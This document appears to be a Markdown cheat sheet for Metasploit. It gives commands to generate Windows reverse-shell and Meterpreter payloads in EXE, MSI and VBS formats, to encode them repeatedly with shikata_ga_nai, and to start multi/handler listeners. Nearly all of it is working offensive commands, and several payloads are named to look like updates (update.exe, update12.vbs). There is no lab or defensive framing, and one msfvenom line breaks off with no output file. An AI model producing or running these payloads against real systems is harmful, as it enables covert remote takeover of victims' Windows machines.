# Windows Binary Payloads (Metasploit)

This section covers Windows binary payload generation, listeners, and `msfvenom` usage for reverse shells and Meterpreter payloads.

## Payload: `windows/shell/reverse_tcp`

### Load the payload module

    use payload/windows/shell/reverse_tcp


### Configure listener details

    msf6 payload(windows/shell/reverse_tcp) > set LHOST 192.168.1.7
    msf6 payload(windows/shell/reverse_tcp) > set LPORT 443

### View payload generation options

    msf6 payload(windows/shell/reverse_tcp) > generate -h


### Generate a basic EXE payload

    msf6 payload(windows/shell/reverse_tcp) > generate -o update.exe -f exe


### Generate EXE with bad characters and PowerShell encoder

    msf6 payload(windows/shell/reverse_tcp) > generate -f exe -b '\x00\x0a\x0d' -e 'cmd/powershell_base64' -o update2.exe


### Generate EXE with encoding and multiple iterations

    msf6 payload(windows/shell/reverse_tcp) > generate -f exe -b '\x00\x0a\x0d' -e 'cmd/powershell_base64' -o update3.exe -E -i 5


---

## Payload: `windows/meterpreter/reverse_tcp`

### Load the payload module

    use payload/windows/meterpreter/reverse_tcp


### Configure listener details

    set LHOST 192.168.1.6

    set LPORT 443


### Generate MSI payload

    generate -o /tmp/3.msi -f msi


---

## Listener (Multi/Handler)

### Start a Meterpreter listener
use exploit/multi/handler

        msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
        msf6 exploit(multi/handler) > set LHOST 192.168.1.6
        msf6 exploit(multi/handler) > set LPORT 443
        msf6 exploit(multi/handler) > exploit


### One-liner listener command

    msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.7; set LPORT 443; exploit"



---

## Payload Generation with `msfvenom`

### View help

    msfvenom --help


### Generate reverse shell EXE (encoded)

    msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.6 LPORT=443 -a x86 --platform windows -b '\x00\xff\x0a\x0d' -e x86/shikata_ga_nai -i 5 -f exe -o /tmp/update2.exe


### Generate simple reverse shell EXE

    msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.6 LPORT=443 -f exe -o /tmp/update4.exe
    
### Generate encoded reverse shell EXE

    msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.6 LPORT=443 -a x86 --platform windows -b '\x00\xff\x0a\x0d' -e x86/shikata_ga_nai -i 5 -f exe -o /tmp/update5.exe

### Generate Meterpreter EXE

    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.6 LPORT=443 -a x86 --platform windows -f exe -o /tmp/1.exe


### Generate Meterpreter VBS payload

    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.6 LPORT=443 -a x86 --platform windows -b '\x00\xff\x0a\x0d' -e x86/shikata_ga_nai -i 5 -f vbs -o /tmp/2.vbs

### Redirect output to file

    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4455 -a x86 --platform windows -b '\x00\xff\x0a\x0d' -e x86/shikata_ga_nai -i 5 -f vbs >

### Generate Meterpreter EXE

    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.7 LPORT=443 -a x86 --platform windows -f exe -o update11.exe

### Generate Meterpreter VBS payload

    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.7 LPORT=443 -a x86 --platform windows -b '\x00\xff\x0a\x0d' -e x86/shikata_ga_nai -i 5 -f vbs -o update12.vbs


### Redirect output to file

    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4455 -a x86 --platform windows -b '\x00\xff\x0a\x0d' -e x86/shikata_ga_nai -i 5 -f vbs > update13.vbs

## Listener (One-liner)

    msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.7; set LPORT 443; exploit"

